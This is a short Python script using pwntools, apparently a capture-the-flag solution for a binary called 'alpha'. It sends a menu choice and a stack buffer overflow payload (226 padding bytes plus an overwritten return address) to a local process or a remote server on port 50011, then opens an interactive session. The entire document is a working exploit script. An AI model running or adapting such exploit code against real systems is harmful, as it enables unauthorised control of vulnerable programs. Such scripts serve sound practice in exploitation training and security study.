#!/bin/env python3

from pwn import *

binary = "./alpha"

# <><><> PAYLOAD <><><><><><><><><><><><><><><><><><>
payload = b"a" * 226 + p32(0x80494e6)
# <><><> PAYLOAD <><><><><><><><><><><><><><><><><><>

info("payload : \n" + hexdump(payload))

context.terminal = ["/bin/gnome-terminal", "--"]

if args["SERVER"]:
    io = remote(args["SERVER"], 50011)
else:
    p = ELF(binary)
    io = p.process()
    #io = p.debug()

io.sendline("2")
io.sendline(payload)
io.interactive()
